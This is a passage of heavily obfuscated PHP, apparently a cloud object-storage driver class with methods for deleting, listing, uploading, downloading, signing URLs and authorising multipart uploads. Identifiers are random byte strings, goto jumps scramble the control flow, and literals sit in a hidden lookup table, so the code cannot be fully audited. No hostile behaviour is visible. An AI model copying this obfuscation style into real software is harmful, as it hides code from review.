delFile($B´ÍÁñ™) { return $this->client->deleteObject($this->bucket, $B´ÍÁñ™); } public function delFolder($Fäã£¢Ó‚­) { goto f‡Ëî¬‚öµ; f‡Ëî¬‚öµ: $dÊŸÇ•¢‹¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->exist($Fäã£¢Ó‚­)) { return !0; } $this->listItemCache = !1; goto d‡õŠ•ã¬ñ; cíèÆ™‚¨ã: if (!empty($Fäã£¢Ó‚­) && !in_array($B‡ÎŠ–˜œŠ, $B¼ã£İ’·[$dÊŸÇ•¢‹¥[74]])) { $B¼ã£İ’·[$dÊŸÇ•¢‹¥[74]][] = $B‡ÎŠ–˜œŠ; } $Cô‡—•ÙŒ = $this->delByBatch($B¼ã£İ’·[$dÊŸÇ•¢‹¥[73]]); if (!$Cô‡—•ÙŒ) { return !1; } goto D‡‰çâ‡µ™; D‡‰çâ‡µ™: return $this->delByBatch($B¼ã£İ’·[$dÊŸÇ•¢‹¥[74]]); goto e‡§Ì”‰¥¡; d‡õŠ•ã¬ñ: $B¼ã£İ’· = $this->fileList($Fäã£¢Ó‚­); $this->listItemCache = !0; $B‡ÎŠ–˜œŠ = trim($Fäã£¢Ó‚­, $dÊŸÇ•¢‹¥[8]) . $dÊŸÇ•¢‹¥[8]; goto cíèÆ™‚¨ã; e‡§Ì”‰¥¡: } private function delByBatch($Bó­ÖÅóç) { foreach (array_chunk($Bó­ÖÅóç, 1000) as $b²®ÛŠ’š) { $dáô¥—ƒµ = $this->client->deleteObjects($this->bucket, $b²®ÛŠ’š); if (!$dáô¥—ƒµ) { return !1; } } return !0; } public function rename($a”—äò†Ã“, $aéÖ„©Í´) { return $this->renameObject($a”—äò†Ã“, $aéÖ„©Í´); } public function listPath($Bñ‚£ä«õ, $A›êêÙ¹Ö‚ = false) { $B·àæáƒ‹• =& $_SERVER[åÌÛ»ô¢‚ö™]; $E„›ö‚ÉĞ = $this->fileList($Bñ‚£ä«õ, $B·àæáƒ‹•[8], !0); foreach ($E„›ö‚ÉĞ[$B·àæáƒ‹•[74]] as $a ’ø”‹« => $f¬£©¦ˆÂô) { $E„›ö‚ÉĞ[$B·àæáƒ‹•[74]][$a ’ø”‹«] = $this->folderInfo($f¬£©¦ˆÂô, $A›êêÙ¹Ö‚); } foreach ($E„›ö‚ÉĞ[$B·àæáƒ‹•[73]] as $a ’ø”‹« => $f¬£©¦ˆÂô) { $E„›ö‚ÉĞ[$B·àæáƒ‹•[73]][$a ’ø”‹«] = $this->fileInfo($f¬£©¦ˆÂô[$B·àæáƒ‹•[28]], $A›êêÙ¹Ö‚, $f¬£©¦ˆÂô); } return $E„›ö‚ÉĞ; } private function fileInfo($cÛ„‚»âŠğ, $Cù®„ã‰ìå = false, $bÒ²†ÜÄ¯¦ = array()) { goto f•³œ§î’; f•³œ§î’: $eÎ†‘­Öíï =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÆŠ¯¼§‡ = array($eÎ†‘­Öíï[28] => $this->pathThis($cÛ„‚»âŠğ), $eÎ†‘­Öíï[75] => $this->getPathOuter($cÛ„‚»âŠğ), $eÎ†‘­Öíï[29] => $eÎ†‘­Öíï[171], $eÎ†‘­Öíï[165] => $this->ext($cÛ„‚»âŠğ), $eÎ†‘­Öíï[77] => isset($bÒ²†ÜÄ¯¦[$eÎ†‘­Öíï[77]]) ? $bÒ²†ÜÄ¯¦[$eÎ†‘­Öíï[77]] : 0); if ($Cù®„ã‰ìå) { return $AÆŠ¯¼§‡; } goto d¼ß¯±Şòï; a¹±¤Ä¥²: if (isset($bÒ²†ÜÄ¯¦[$eÎ†‘­Öíï[203]])) { $AÆŠ¯¼§‡[$eÎ†‘­Öíï[107]] = $bÒ²†ÜÄ¯¦[$eÎ†‘­Öíï[203]]; } if (isset($bÒ²†ÜÄ¯¦[$eÎ†‘­Öíï[77]])) { $AÆŠ¯¼§‡[$eÎ†‘­Öíï[77]] = $bÒ²†ÜÄ¯¦[$eÎ†‘­Öíï[77]]; } return $AÆŠ¯¼§‡; goto a‚Ï˜†ğ·“; d¼ß¯±Şòï: $AÆŠ¯¼§‡[$eÎ†‘­Öíï[200]] = $AÆŠ¯¼§‡[$eÎ†‘­Öíï[107]] = 0; $AÆŠ¯¼§‡[$eÎ†‘­Öíï[201]] = $AÆŠ¯¼§‡[$eÎ†‘­Öíï[202]] = !0; if (empty($bÒ²†ÜÄ¯¦)) { $bÒ²†ÜÄ¯¦ = $this->objectMeta($cÛ„‚»âŠğ); if (!$bÒ²†ÜÄ¯¦) { return $AÆŠ¯¼§‡; } } goto a¹±¤Ä¥²; a‚Ï˜†ğ·“: } private function folderInfo($BğœŸê¸•¿, $EèÏò© = false) { goto E¦ã”¿ÑÎ¿; E¦ã”¿ÑÎ¿: $E¬øØî¡ˆ° =& $_SERVER[åÌÛ»ô¢‚ö™]; $F÷Ô¶×óËî = array($E¬øØî¡ˆ°[28] => $this->pathThis($BğœŸê¸•¿), $E¬øØî¡ˆ°[75] => $this->getPathOuter($E¬øØî¡ˆ°[8] . $BğœŸê¸•¿), $E¬øØî¡ˆ°[29] => $E¬øØî¡ˆ°[76]); if ($EèÏò©) { return $F÷Ô¶×óËî; } goto C¢çïïÚ–±; f­œÌ³æâ±: $BğœŸê¸•¿ = trim($BğœŸê¸•¿, $E¬øØî¡ˆ°[8]) . $E¬øØî¡ˆ°[8]; $eÀç»ã´¸´ = $this->objectMeta($BğœŸê¸•¿); if (isset($eÀç»ã´¸´[$E¬øØî¡ˆ°[203]])) { $F÷Ô¶×óËî[$E¬øØî¡ˆ°[200]] = $eÀç»ã´¸´[$E¬øØî¡ˆ°[203]]; } goto d½½‹ùæÂî; d½½‹ùæÂî: return $F÷Ô¶×óËî; goto Bˆ£‹ÄÉÊ¨; C¢çïïÚ–±: $F÷Ô¶×óËî[$E¬øØî¡ˆ°[200]] = $F÷Ô¶×óËî[$E¬øØî¡ˆ°[107]] = 0; $F÷Ô¶×óËî[$E¬øØî¡ˆ°[201]] = $F÷Ô¶×óËî[$E¬øØî¡ˆ°[202]] = !0; if ($BğœŸê¸•¿ == $E¬øØî¡ˆ°[33]) { return $F÷Ô¶×óËî; } goto f­œÌ³æâ±; Bˆ£‹ÄÉÊ¨: } private function fileList($bÏˆµÃ´±¹, $AÈ›Û¯äç“ = '', $c«÷¨›†ÒÎ = 0) { goto dğ’Ñ„àÎÙ; FçŞÖÑ³»ƒ: return array($cæ†‚Ú“[74] => $Dˆ¥§¥†½„, $cæ†‚Ú“[73] => $c¬›Îœ®§); goto bä¬ƒº·•¾; EÅœ·ÙóİÒ: foreach ($FÓò‰‰òÀ[$cæ†‚Ú“[204]] as $DÄ—ßõÁ¡) { goto eÕÅŸŒŞ¤«; d÷ÂˆÆƒ‰»: $EÊ¦”¦ñÉ = $aÔŠ÷‚·‹ø == 0 && substr($F·¶«“Š¾Ì, strlen($F·¶«“Š¾Ì) - 1, 1) == $cæ†‚Ú“[8] ? !0 : !1; if ($aÎ¿âÚÂí) { $this->cacheMethod($cæ†‚Ú“[205], $F·¶«“Š¾Ì, $EÊ¦”¦ñÉ); $this->cacheMethod($cæ†‚Ú“[206], $F·¶«“Š¾Ì, $DÄ—ßõÁ¡); } if ($EÊ¦”¦ñÉ) { $Dˆ¥§¥†½„[] = $F·¶«“Š¾Ì; continue; } goto eÀµ–†£˜Ä; eÀµ–†£˜Ä: $c¬›Îœ®§[] = $c«÷¨›†ÒÎ ? $DÄ—ßõÁ¡ : $F·¶«“Š¾Ì; goto F—ˆË“†Ô; eÕÅŸŒŞ¤«: $F·¶«“Š¾Ì = $DÄ—ßõÁ¡[$cæ†‚Ú“[28]]; if ($F·¶«“Š¾Ì == $BØĞ­à×ïŒ) { continue; } $aÔŠ÷‚·‹ø = isset($DÄ—ßõÁ¡[$cæ†‚Ú“[77]]) ? $DÄ—ßõÁ¡[$cæ†‚Ú“[77]] : 0; goto d÷ÂˆÆƒ‰»; F—ˆË“†Ô: } foreach ($FÓò‰‰òÀ[$cæ†‚Ú“[207]] as $DÄ—ßõÁ¡) { $Dˆ¥§¥†½„[] = $DÄ—ßõÁ¡[$cæ†‚Ú“[28]]; if ($aÎ¿âÚÂí) { $this->cacheMethod($cæ†‚Ú“[205], $DÄ—ßõÁ¡[$cæ†‚Ú“[28]], !0); } } if ($aÎ¿âÚÂí) { $this->cacheMethod($cæ†‚Ú“[205], $bÏˆµÃ´±¹, !0); } goto FçŞÖÑ³»ƒ; Fª¬Ô‰Ö²ƒ: if (!$FÓò‰‰òÀ) { return array($cæ†‚Ú“[74] => array(), $cæ†‚Ú“[73] => array()); } $aÎ¿âÚÂí = $this->listItemCache === !1 ? !1 : !0; $Dˆ¥§¥†½„ = $c¬›Îœ®§ = array(); goto EÅœ·ÙóİÒ; dğ’Ñ„àÎÙ: $cæ†‚Ú“ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BØĞ­à×ïŒ = rtrim($bÏˆµÃ´±¹, $cæ†‚Ú“[8]) . $cæ†‚Ú“[8]; $FÓò‰‰òÀ = $this->listObjs($BØĞ­à×ïŒ, null, null, $AÈ›Û¯äç“); goto Fª¬Ô‰Ö²ƒ; bä¬ƒº·•¾: } private function listObjs($eìš‚§ä…è, $B±‘×âÙğà = null, $b§–¾ø¡ù¨ = null, $a¤µÆ«°— = null) { $Dª‡…‚„Ê =& $_SERVER[åÌÛ»ô¢‚ö™]; $eìš‚§ä…è = trim($eìš‚§ä…è, $Dª‡…‚„Ê[8]); $eâÎÛò ±Œ = empty($eìš‚§ä…è) ? $Dª‡…‚„Ê[33] : $eìš‚§ä…è . $Dª‡…‚„Ê[8]; return $this->client->getBucket($this->bucket, $eâÎÛò ±Œ, $B±‘×âÙğà, $b§–¾ø¡ù¨, $a¤µÆ«°—, !0); } public function has($c²¶”Øæ³Ø, $A’õ„‘°§ = false, $fĞàˆª×š = true) { goto fÎ¥š’Á²; fÎ¥š’Á²: $CŠğæ–ˆ‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c²¶”Øæ³Ø = trim($c²¶”Øæ³Ø, $CŠğæ–ˆ‘[8]); $dë„—·åõÓ = empty($c²¶”Øæ³Ø) ? $CŠğæ–ˆ‘[33] : $c²¶”Øæ³Ø . $CŠğæ–ˆ‘[8]; goto BÀ°³›¤Ë‘; Fµ”ƒğàÙ‡: return !1; goto eÆÖ‚¨ÜèÀ; bÑØ§†òæÙ: $Cªôí®ã±ì = $c†Ø„ÏÄê = array(); while (!0) { check_abort(); $fÖ•ÀÍÕá– = $this->listObjs($c²¶”Øæ³Ø, $Eé¶·ó¥¼Ù, $A°àãÜ—“, $a„¥¦ˆˆğˆ); if (!$fÖ•ÀÍÕá–) { break; } $Eé¶·ó¥¼Ù = $fÖ•ÀÍÕá–[$CŠğæ–ˆ‘[208]]; $B¡‡ÁŒÔ‚… = $fÖ•ÀÍÕá–[$CŠğæ–ˆ‘[204]]; $aèéÏÁÚ½ˆ = $fÖ•ÀÍÕá–[$CŠğæ–ˆ‘[207]]; if (empty($B¡‡ÁŒÔ‚…) && empty($aèéÏÁÚ½ˆ)) { break; } if ($A’õ„‘°§) { if (count($B¡‡ÁŒÔ‚…)) { $B¡‡ÁŒÔ‚… = array_column($B¡‡ÁŒÔ‚…, $CŠğæ–ˆ‘[28]); $Cªôí®ã±ì = array_merge($Cªôí®ã±ì, $B¡‡ÁŒÔ‚…); } if (count($aèéÏÁÚ½ˆ)) { $aèéÏÁÚ½ˆ = array_column($aèéÏÁÚ½ˆ, $CŠğæ–ˆ‘[28]); $c†Ø„ÏÄê = array_merge($c†Ø„ÏÄê, $aèéÏÁÚ½ˆ); } if ($Eé¶·ó¥¼Ù === null) { break; } continue; } if ($fĞàˆª×š) { if (!empty($B¡‡ÁŒÔ‚…)) { if (count($B¡‡ÁŒÔ‚…) > 1 || isset($B¡‡ÁŒÔ‚…[0][$CŠğæ–ˆ‘[28]]) && $B¡‡ÁŒÔ‚…[0][$CŠğæ–ˆ‘[28]] != $dë„—·åõÓ) { return !0; } } } else { if (!empty($aèéÏÁÚ½ˆ)) { return !0; } } if ($Eé¶·ó¥¼Ù === null) { break; } } if ($A’õ„‘°§) { $Cªôí®ã±ì = array_diff($Cªôí®ã±ì, array($dë„—·åõÓ)); $Cªôí®ã±ì = count(array_unique($Cªôí®ã±ì)); $c†Ø„ÏÄê = count(array_unique($c†Ø„ÏÄê)); return array($CŠğæ–ˆ‘[209] => $Cªôí®ã±ì, $CŠğæ–ˆ‘[210] => $c†Ø„ÏÄê); } goto Fµ”ƒğàÙ‡; BÀ°³›¤Ë‘: $Eé¶·ó¥¼Ù = null; $A°àãÜ—“ = 500; $a„¥¦ˆˆğˆ = $CŠğæ–ˆ‘[8]; goto bÑØ§†òæÙ; eÆÖ‚¨ÜèÀ: } public function listAll($EØ„ñ«··…) { $B¼â·ŠÍ†Æ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fïô Ü™ë‡ = $this->fileList($EØ„ñ«··…, $B¼â·ŠÍ†Æ[33], !0); $cÓÊ•×‡¤‡ = array(); foreach ($fïô Ü™ë‡[$B¼â·ŠÍ†Æ[73]] as $B«êĞó§ò’) { $cÓÊ•×‡¤‡[$B«êĞó§ò’[$B¼â·ŠÍ†Æ[28]]] = $B«êĞó§ò’[$B¼â·ŠÍ†Æ[77]]; } foreach ($fïô Ü™ë‡[$B¼â·ŠÍ†Æ[74]] as $B«êĞó§ò’) { if (is_string($B«êĞó§ò’)) { $cÓÊ•×‡¤‡[$B«êĞó§ò’] = 0; } } return $this->listAllFiles($EØ„ñ«··…, array_keys($cÓÊ•×‡¤‡), $cÓÊ•×‡¤‡); } public function canRead($cŒ§ººõ ·) { $C™ÚŞøœŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eÕªÉ¤ñµ = $this->client->getAccessControlPolicy($this->bucket, $cŒ§ººõ ·); if (!$eÕªÉ¤ñµ) { return !1; } return in_array($eÕªÉ¤ñµ, array($C™ÚŞøœŒ[211], $C™ÚŞøœŒ[212], $C™ÚŞøœŒ[213])) ? !0 : !1; } public function canWrite($e¨ÜòÇÄ›¸) { $f¥ªƒù¤Î» =& $_SERVER[åÌÛ»ô¢‚ö™]; $d¬ÒÕõ…¢‚ = $this->client->getAccessControlPolicy($this->bucket, $e¨ÜòÇÄ›¸); if (!$d¬ÒÕõ…¢‚) { return !1; } return in_array($d¬ÒÕõ…¢‚, array($f¥ªƒù¤Î»[211], $f¥ªƒù¤Î»[212])) ? !0 : !1; } public function getContent($f ó™ÁÂùİ) { return $this->client->getObject($this->bucket, $f ó™ÁÂùİ); } public function setContent($bÎ„æàÍ‰™, $dì¾İäØ = '', $EÓƒÉóèÑ = false) { goto e½™ÀŒ¡Ô“; FÓÆ°®ƒŞ·: $this->cacheMethod(null, null); $a×ïÃ¬ÉØ’ = $this->copyFile($bÎ„æàÍ‰™, $bÎ„æàÍ‰™, array($c²§ø¡ï‘[214] => $a×ïÃ¬ÉØ’[$c²§ø¡ï‘[215]])); return $a×ïÃ¬ÉØ’ ? !0 : !1; goto E‹ùè¿; FåÂİÓ×œƒ: $a×ïÃ¬ÉØ’ = $this->client->putObject($dì¾İäØ, $this->bucket, $bÎ„æàÍ‰™, $c²§ø¡ï‘[199], array(), $a  Ğå½í); if (!$a×ïÃ¬ÉØ’) { return !1; } if ($EÓƒÉóèÑ) { return !0; } goto FÓÆ°®ƒŞ·; e½™ÀŒ¡Ô“: $c²§ø¡ï‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÎ„æàÍ‰™ = $EÓƒÉóèÑ ? trim($bÎ„æàÍ‰™, $c²§ø¡ï‘[8]) . $c²§ø¡ï‘[8] : $bÎ„æàÍ‰™; $a  Ğå½í = get_file_mime(get_path_ext($bÎ„æàÍ‰™)); goto FåÂİÓ×œƒ; E‹ùè¿: } public function fileSubstr($BÅ„–¬ìä­, $FÛ¢Ô…Ï©é, $cÂ¿„†ÍÉ…) { $aò‡…‡É”æ = $FÛ¢Ô…Ï©é + $cÂ¿„†ÍÉ… - 1; return $this->client->getObject($this->bucket, $BÅ„–¬ìä­, array($_SERVER[åÌÛ»ô¢‚ö™][216] => "\x62\171\164\x65\163\75{$FÛ¢Ô…Ï©é}\55{$aò‡…‡É”æ}")); } public function upload($aÒõéÍ˜ˆ–, $EÁ…«®óöå, $dŠ‡ƒîÙ§× = false, $d›óæÓËªë = REPEAT_REPLACE) { $c³°Ç§™” =& $_SERVER[åÌÛ»ô¢‚ö™]; $C»ÅáÒèŠ­ = array($c³°Ç§™”[214] => @md5_file($EÁ…«®óöå)); $F®‹ÒíšÍƒ = array($c³°Ç§™”[217] => get_file_mime(get_path_ext($aÒõéÍ˜ˆ–))); if (IO::size($EÁ…«®óöå) <= 1024 * 1024 * 200) { $BÀ¦‰í‘Ş¡ = $this->client->putObjectFile($EÁ…«®óöå, $this->bucket, $aÒõéÍ˜ˆ–, $c³°Ç§™”[199], $C»ÅáÒèŠ­, $F®‹ÒíšÍƒ); return !empty($BÀ¦‰í‘Ş¡) ? $this->getPathOuter($aÒõéÍ˜ˆ–) : !1; } $céŸ”š› = $this->client->multiUploadObject($EÁ…«®óöå, $this->bucket, trim($aÒõéÍ˜ˆ–, $c³°Ç§™”[8]), $C»ÅáÒèŠ­, $F®‹ÒíšÍƒ); return $céŸ”š› ? $this->getPathOuter($aÒõéÍ˜ˆ–) : !1; } public function download($bÛ¶‚ÕÕ¦†, $A£Ò”À†¡ø) { if (!@is_dir($this->pathFather($A£Ò”À†¡ø)) && !IO::mkdir($this->pathFather($A£Ò”À†¡ø))) { return !1; } $Bµá¶¶ŠÏ = $this->client->getObject($this->bucket, $bÛ¶‚ÕÕ¦†, array(), $A£Ò”À†¡ø); return $Bµá¶¶ŠÏ !== !1 ? $A£Ò”À†¡ø : !1; } public function link($c‘Š†³Ö¯ğ, $C†çÏœ•‡ = array()) { $D²©ŠˆÏ…¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->signVer == $D²©ŠˆÏ…¥[218]) { return $this->client->getAuthenticatedURL($this->bucket, $c‘Š†³Ö¯ğ, 3600 * 12, $C†çÏœ•‡); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($c‘Š†³Ö¯ğ, $D²©ŠˆÏ…¥[8]), 3600 * 12, $this->region, array(), !0, $C†çÏœ•‡); } public function fileOut($C¬¡îµ©, $eˆ®æ¯ãˆÔ = false, $CßÜ•¶ËÖ‰ = false, $D‰Şó®‰¨Œ = '') { goto D¡¿·³¨Ï‹; D¡¿·³¨Ï‹: $BÅíÖ¾íİ¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($this->isFileOutServer()) { return $this->fileOutServer($C¬¡îµ©, $eˆ®æ¯ãˆÔ, $CßÜ•¶ËÖ‰, $D‰Şó®‰¨Œ); } if (!$CßÜ•¶ËÖ‰) { $CßÜ•¶ËÖ‰ = $this->pathThis($C¬¡îµ©); } goto a‘Â£ìÑº; a‘Â£ìÑº: $aĞ·ƒÂ¤ª„ = get_file_mime(get_path_ext($CßÜ•¶ËÖ‰)); if ($aĞ·ƒÂ¤ª„ == $BÅíÖ¾íİ¶[219]) { return parent::fileOut($C¬¡îµ©, $eˆ®æ¯ãˆÔ, $CßÜ•¶ËÖ‰, $D‰Şó®‰¨Œ); } $eˆ®æ¯ãˆÔ = $eˆ®æ¯ãˆÔ ? $BÅíÖ¾íİ¶[220] : $BÅíÖ¾íİ¶[221]; goto fà™ïŠÃÜ²; fà™ïŠÃÜ²: $A‹ˆô–„¢Å = array($BÅíÖ¾íİ¶[222] => $eˆ®æ¯ãˆÔ . $BÅíÖ¾íİ¶[223] . rawurlencode($CßÜ•¶ËÖ‰), $BÅíÖ¾íİ¶[224] => $aĞ·ƒÂ¤ª„); $C¦—¤ÀåÜ‹ = $this->link($C¬¡îµ©, $A‹ˆô–„¢Å); $this->fileOutLink($C¦—¤ÀåÜ‹); goto A–·––Ê; A–·––Ê: } public function fileOutServer($BÄ‰“æç, $dœ¡ÀñÎæ– = false, $D£âƒ¦ÏÁ = false, $c¯ã©ùè†á = '') { parent::fileOut($BÄ‰“æç, $dœ¡ÀñÎæ–, $D£âƒ¦ÏÁ, $c¯ã©ùè†á); } public function fileOutImageServer($EÂ°ÖÔñ» , $fáªÓ“Ş©š = 250) { parent::fileOutImage($EÂ°ÖÔñ» , $fáªÓ“Ş©š); } public function hashMd5($AöÇÊ©ëÙ, $bÉ¶Úò›¶ì = '') { $D‰¼±ïí«‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B±—²¯ƒé´ = $this->objectMeta($AöÇÊ©ëÙ); if (!$B±—²¯ƒé´) { return !1; } $bÉ¶Úò›¶ì = $bÉ¶Úò›¶ì ? $bÉ¶Úò›¶ì : _get($B±—²¯ƒé´, $D‰¼±ïí«‘[225]); $bÉ¶Úò›¶ì = $bÉ¶Úò›¶ì ? $bÉ¶Úò›¶ì : _get($B±—²¯ƒé´, $D‰¼±ïí«‘[215], $D‰¼±ïí«‘[33]); return $bÉ¶Úò›¶ì; } public function uploadFormData($f¸•¸ô¶Ñ£, $cÈÅ‚ßØæ“ = 3600) { $c¼ÆÍÁê¼ô =& $_SERVER[åÌÛ»ô¢‚ö™]; $B¬ã„ğ…¯Ï = $this->pathFather($f¸•¸ô¶Ñ£); $dó¨ì²´Ğ = $this->client->getHttpUploadPostParams($this->bucket, $B¬ã„ğ…¯Ï, $c¼ÆÍÁê¼ô[199], $cÈÅ‚ßØæ“); return array_merge((array) $dó¨ì²´Ğ, array($c¼ÆÍÁê¼ô[173] => $this->getHost())); } public function multiUploadFormData($Eö»‡‡õã†, $c™‡¿òÔà = 3600) { $fˆ•‹è÷Û =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÈ‰Ñ¬©Š… = gmdate($fˆ•‹è÷Û[226]); $d¼Îâò›İö = array(); $aì©£›‡ù· = $this->client->getUploadId($this->bucket, $Eö»‡‡õã†, $d¼Îâò›İö); if (!$aì©£›‡ù·) { return !1; } return array($fˆ•‹è÷Û[227] => $aì©£›‡ù·, $fˆ•‹è÷Û[173] => $this->getHost() . $fˆ•‹è÷Û[8] . $this->pathEncode($Eö»‡‡õã†), $fˆ•‹è÷Û[228] => $dÈ‰Ñ¬©Š…, $fˆ•‹è÷Û[89] => $Eö»‡‡õã†); } public function multiUploadAuthData($fö‚š£ÖØ, $Eİ°³Ê¼ = array()) { goto cÓì†ª¤ìì; dŒ³ª¿–„Œ: if (strpos($FŒÀ¼ïœõ, $c…ˆ’ÑŠ©¿[231]) === 0) { return array($c…ˆ’ÑŠ©¿[237] => $e­ğ®‰´ˆù, $c…ˆ’ÑŠ©¿[228] => $b—Â¬¿½İ); } return $e­ğ®‰´ˆù; goto C †§¬¸; cÓì†ª¤ìì: $c…ˆ’ÑŠ©¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b—Â¬¿½İ = isset($Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[228]]) ? $Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[228]] : gmdate($c…ˆ’ÑŠ©¿[226]); $FŒÀ¼ïœõ = isset($Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[165]]) ? $Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[165]] : $c…ˆ’ÑŠ©¿[33]; goto eà‰•³¸·´; fÄİ±­®ìÂ: $eŞ‡…Î“Éã = array($c…ˆ’ÑŠ©¿[230], $c…ˆ’ÑŠ©¿[33], $c…ˆ’ÑŠ©¿[116], $c…ˆ’ÑŠ©¿[33], "\170\x2d\141\155\x7a\55\x64\141\164\145\x3a{$b—Â¬¿½İ}", $c…ˆ’ÑŠ©¿[8] . $this->bucket . $c…ˆ’ÑŠ©¿[8] . $this->pathEncode($E‘Œ‡éö…) . $FŒÀ¼ïœõ); if (strpos($FŒÀ¼ïœõ, $c…ˆ’ÑŠ©¿[231]) === 0) { $eŞ‡…Î“Éã[0] = $c…ˆ’ÑŠ©¿[232]; } if (isset($Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[233]]) && $Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[233]] == $c…ˆ’ÑŠ©¿[234]) { $eŞ‡…Î“Éã[0] = $c…ˆ’ÑŠ©¿[234]; } goto cÅ°ê‚¡Äñ; eà‰•³¸·´: $E‘Œ‡éö… = $Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[89]]; unset($Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[89]]); if (isset($Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[229]])) { $Eİ°³Ê¼[$c…ˆ’ÑŠ©¿[228]] = $b—Â¬¿½İ; return $this->listUploadParts($E‘Œ‡éö…, $Eİ°³Ê¼); } goto fÄİ±­®ìÂ; cÅ°ê‚¡Äñ: $e©‹áÚİè = implode($c…ˆ’ÑŠ©¿[183], $eŞ‡…Î“Éã); $a‰ñÏ°ä²¤ = base64_encode(hash_hmac($c…ˆ’ÑŠ©¿[235], $e©‹áÚİè, $this->secret, !0)); $e­ğ®‰´ˆù = $c…ˆ’ÑŠ©¿[236] . $this->accessKey . $c…ˆ’ÑŠ©¿[4] . $a‰ñÏ°ä²¤; goto dŒ³ª¿–„Œ; C †§¬¸: } public function listUploadParts($Dç‚ã‹ÄÆ, $C–‘ìÃŠÕÚ = array()) { goto F©œ˜¼¢Í¨; bµ†’Òìİ: $c¯ÄñÙ¥¾¬ = $this->multiUploadAuthData($Dç‚ã‹ÄÆ, $C–‘ìÃŠÕÚ); if (empty($c¯ÄñÙ¥¾¬)) { return !1; } return array($C³­Æ˜Æ˜í[237] => $c¯ÄñÙ¥¾¬, $C³­Æ˜Æ˜í[228] => $C–‘ìÃŠÕÚ[$C³­Æ˜Æ˜í[228]], $C³­Æ˜Æ˜í[239] => $f‡´«òôËœ); goto e—Á‘®½é¨; F©œ˜¼¢Í¨: $C³­Æ˜Æ˜í =& $_SERVER[åÌÛ»ô¢‚ö™]; $Dóöö¾§… = str_replace($C³­Æ˜Æ˜í[238], $C³­Æ˜Æ˜í[33], $C–‘ìÃŠÕÚ[$C³­Æ˜Æ˜í[165]]); $f‡´«òôËœ = $this->client->listParts($this->bucket, $Dç‚ã‹ÄÆ, $Dóöö¾§…); goto f¤Ÿ¬²Ì; f¤Ÿ¬²Ì: if (!$f‡´«òôËœ) { return !1; } unset($C–‘ìÃŠÕÚ[$C³­Æ˜Æ˜í[229]], $C–‘ìÃŠÕÚ[$C³­Æ˜Æ˜í[233]]); $C–‘ìÃŠÕÚ[$C³­Æ˜Æ˜í[89]] = $Dç‚ã‹ÄÆ; goto bµ†’Òìİ; e—Á‘®½é¨: } public function getHost() { return parent::getHost() . $_SERVER[åÌÛ»ô¢‚ö™][8] . $this->bucket; } public function size($aÇï·†Ôô×) { $E¼‚ÏÜ˜Óá = $this->objectMeta($aÇï·†Ôô×); return $E¼‚ÏÜ˜Óá ? $E¼‚ÏÜ˜Óá[$_SERVER[åÌÛ»ô¢‚ö™][77]] : 0; } public function info($CêîÄŒ¿) { if ($this->isFolder($CêîÄŒ¿)) { return $this->folderInfo($CêîÄŒ¿); } else { if ($this->isFile($CêîÄŒ¿)) { return $this->fileInfo($CêîÄŒ¿); } } return !1; } public function exist($dºñ¤èÓ–á) { return $this->isFile($dºñ¤èÓ–á) || $this->isFolder($dºñ¤èÓ–á); } public function isFile($EùÑ½õ›Ç) { return !$this->isFolder($EùÑ½õ›Ç) && $this->objectMeta($EùÑ½õ›Ç); } public function isFolder($dø¶íÁÕ¿Ó) { return $this->cacheMethod($_SERVER[åÌÛ»ô¢‚ö™][205], $dø¶íÁÕ¿Ó); } protected function objectMeta($dØÂ£¬äñŒ) { return $this->cacheMethod($_SERVER[åÌÛ»ô¢‚ö™][206], $dØÂ£¬äñŒ); } protected function _objectMeta($F‹ÒÙîîŠ¾) { $F‡–˜ƒŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F‹ÒÙîîŠ¾ = rtrim($F‹ÒÙîîŠ¾, $F‡–˜ƒŒ[8]); try { $C„¬«ñÕ­È = $this->client->getObjectInfo($this->bucket, $F‹ÒÙîîŠ¾); if (!isset($C„¬«ñÕ­È[$F‡–˜ƒŒ[225]]) && isset($C„¬«ñÕ­È[$F‡–˜ƒŒ[240]])) { $C„¬«ñÕ­È[$F‡–˜ƒŒ[225]] = $C„¬«ñÕ­È[$F‡–˜ƒŒ[240]]; } } catch (Exception $dšÂ‰§À°) { $C„¬«ñÕ­È = !1; } if (!$C„¬«ñÕ­È) { } return $C„¬«ñÕ­È; } protected function _isFolder($Aµó¨»š) { goto Bâ“‚ˆİ‡Û; e¸ºËÈ†: $E°Öõ‚²Ÿä = $this->client->getBucket($this->bucket, $Aµó¨»š, null, 1); if (empty($E°Öõ‚²Ÿä[$CßØŒ§­ÑÈ[204]])) { return !1; } $AĞÀ£ù‚¿… = $E°Öõ‚²Ÿä[$CßØŒ§­ÑÈ[204]][$CßØŒ§­ÑÈ[28]]; goto Có”ŠëÎÌ‰; Có”ŠëÎÌ‰: if (substr($AĞÀ£ù‚¿…, -1) == $CßØŒ§­ÑÈ[8]) { return !0; } if (get_path_this($AĞÀ£ù‚¿…) == get_path_this($Aµó¨»š)) { return !1; } return !0; goto F‹Ñ†ØÜÛÎ; Bâ“‚ˆİ‡Û: $CßØŒ§­ÑÈ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aµó¨»š = rtrim($Aµó¨»š, $CßØŒ§­ÑÈ[8]); if ($Aµó¨»š == $CßØŒ§­ÑÈ[33] || $Aµó¨»š == $CßØŒ§­ÑÈ[8]) { return !0; } goto e¸ºËÈ†; F‹Ñ†ØÜÛÎ: } } 